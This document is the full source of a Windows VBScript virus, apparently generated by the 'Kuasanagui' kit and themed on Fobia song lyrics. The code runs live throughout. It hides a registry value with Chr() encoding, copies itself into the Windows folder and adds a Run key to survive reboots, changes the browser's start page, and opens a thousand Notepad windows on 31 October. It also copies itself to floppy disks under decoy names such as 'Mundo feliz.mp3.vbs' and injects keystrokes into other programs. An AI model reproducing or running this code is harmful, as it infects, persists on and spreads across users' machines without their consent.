'Virus generado por Kuasanagui
ON ERROR RESUME NEXT
Dim Fobiacmsgchxxrl
Dim Fobiacborrchxxrl
Dim Fobiaccolchxxrl
Dim zchxxrl
Dim Fobianarchxxrl
Dim Fobiadichxxrl
Dim Fobiavalchxxrl
Dim Fobiasenchxxrl
Dim Fobiatecchxxrl
Dim vtecchxxrl
Set Fobiawshchxxrl = CreateObject("WScript.Shell")
Set Fobiafsochxxrl= CreateObject("scripting.filesystemobject")
Fobiawshchxxrl.regwrite "HKCU\software\" & Chr(71) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116),Chr(71) & Chr(101) & Chr(111) & Chr(99) & Chr(105) & Chr(116) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(103) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
Fobiafsochxxrl.copyfile wscript.scriptfullname,Fobiafsochxxrl.GetSpecialFolder(0)& "\camila.vbs"
Fobiawshchxxrl.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Kuasanagui","wscript.exe " & Fobiafsochxxrl.GetSpecialFolder(0) & "\camila.vbs %"
Const Wri = 2
Const Cr = True
Dim File
Dim F
File = Fobiafsochxxrl.GetSpecialFolder(0) & "\El microbito.TXT"
Set F = Fobiafsochxxrl.opentextfile(File, Wri, Cr)
F.write "Quisiera ser un microbito," & vbcrlf & "que habite en tu cuerpo," & vbcrlf & "hay para estar muy calientito," & vbcrlf & "casi todo el tiempo," & vbcrlf & "beber de tu sangre, " & vbcrlf & "y en tu carne descansar," & vbcrlf & "de ti me voy a alimentar." & vbcrlf & "" & vbcrlf & "Quiero vivir en una arteria," & vbcrlf & "junto a tu corazon," & vbcrlf & "tu cuerpo para mi seria, " & vbcrlf & "como una gran mansión," & vbcrlf & "correr por tus venas," & vbcrlf & "y en tu sangre siempre estar," & vbcrlf & "de ahi nadie me podra sacar." & vbcrlf & "" & vbcrlf & "Hare una alberca en tu ombliguito," & vbcrlf & "pa meterme a nadar," & vbcrlf & "y si me voy mas abajito," & vbcrlf & "nadie me sacara," & vbcrlf & "beber de tu sangre, " & vbcrlf & "y en tu carne descansar," & vbcrlf & "de ti me voy a alimentar." & vbcrlf & "" & vbcrlf & "De ti me voy a alimentar."
F.close
Fobiawshchxxrl.run "notepad " & Fobiafsochxxrl.GetSpecialFolder(0) & "\El microbito.TXT"
Fobiawshchxxrl.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.jodiendo.com"
Fobiawshchxxrl.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Window title","FOBIA ON ICE"
If month(now) = 10 and day(now) = 31 then
For zchxxrl = 0 to 1000
Fobiawshchxxrl.run ("C:\Windows\notepad.exe")
Next
End If
Fobiavalchxxrl = 0
Fobiatecchxxrl = 0
dichxxrl()
Function dichxxrl()
On Error Resume Next
Do
Fobiatecchxxrl = Fobiatecchxxrl + 1
Fobiavalchxxrl = Fobiavalchxxrl + 1
Randomize timer
Fobiadichxxrl = Int(Rnd * 6)
If Fobiadichxxrl = 0 then Fobianarchxxrl = "Fobia.txt"
If Fobiadichxxrl = 1 then Fobianarchxxrl = "Mundo feliz.mp3"
If Fobiadichxxrl = 2 then Fobianarchxxrl = "Amor chiquito.jpg"
If Fobiadichxxrl = 3 then Fobianarchxxrl = "Fobia on ice.mp3"
If Fobiadichxxrl = 4 then Fobianarchxxrl = "Leche.html"
If Fobiadichxxrl = 5 then Fobianarchxxrl = "microbito.mp3"
If Fobianarchxxrl = "" then Fobianarchxxrl = "LEEME.TXT"
If Fobiavalchxxrl = 900000 then
Fobiafsochxxrl.copyfile Fobiafsochxxrl.GetSpecialFolder(0)& "\camila.vbs","a:\" & Fobianarchxxrl & ".vbs"
Fobiavalchxxrl = 0
End If
If Fobiatecchxxrl = 700000 then
Fobiawshchxxrl.sendkeys "Quisiera ser un microbito...."
Fobiatecchxxrl = 0
Fobiatecchxxrl = 0
End If
Loop
End Function
'Visita la web de mi amigo Gatescript - Geocities.com/gatescript
